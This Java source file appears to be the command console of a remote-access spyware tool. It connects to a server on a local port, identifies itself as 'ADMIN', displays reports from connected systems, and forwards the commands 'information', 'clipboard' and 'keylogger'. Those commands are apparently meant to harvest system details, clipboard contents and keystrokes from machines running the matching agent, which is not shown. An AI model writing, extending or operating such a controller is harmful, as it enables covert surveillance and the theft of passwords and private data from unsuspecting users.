package Controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class Admin {
    public static void main(String[] args) {
        String serverAddress = "127.0.0.1"; 
        int portNumber = 5254; 

        try (
            Socket socket = new Socket(serverAddress, portNumber);
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))
        ) {
            out.println("ADMIN");  
            Thread responseReaderThread = new Thread(() -> {
                try {
                    String serverResponse;
                    while ((serverResponse = in.readLine()) != null) {
                        System.out.println("System connected: " + serverResponse);
                    }
                } catch (IOException e) {
                    System.err.println("Error reading from server: " + e.getMessage());
                }
            });

            responseReaderThread.start();

            String userInput;
            while ((userInput = stdIn.readLine()) != null) {
               
                if (userInput.equalsIgnoreCase("information")) {
                     out.println("information"); 
                }
                else if(userInput.equalsIgnoreCase("clipboard")){
                    out.println("clipboard"); 
                }
                else if(userInput.equalsIgnoreCase("keylogger")){
                    out.println("keylogger");
                }
            }

        
            responseReaderThread.join();
        } catch (IOException | InterruptedException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}
